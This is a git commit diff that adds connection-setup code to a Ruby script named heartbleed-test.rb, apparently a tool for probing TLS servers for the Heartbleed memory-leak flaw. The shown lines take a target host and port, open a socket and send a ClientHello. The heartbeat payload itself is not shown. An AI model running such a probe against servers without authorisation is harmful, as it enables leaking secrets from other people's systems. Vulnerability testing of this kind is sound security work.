9b02847dcd0b7eb2dbef7d5dd81e63cbe93b14ff
krishpranav <krisna.pranav@gmail.com>
2021-07-16 10:32:04 +0530

    test: sock

--- heartbleed-test.rb
+++ heartbleed-test.rb
@@ -11,3 +11,15 @@ def read_until_server_hello_done(sock)
         break if record.value == SERVER_HELLO_DONE
     end
 end
+
+server = ARGV[0]
+port = (ARGV[1] || 443).to_i
+raise "Usage: ruby heartbleed.rb <server>" unless server
+
+sock = begin
+    Timeout.timeout(3) { TCPSocket.open(server, port) }
+rescue Timeout::Error
+    raise "Couldn't connect to #{server}:#{port}"
+end
+
+sock.write(CLIENT_HELLO)
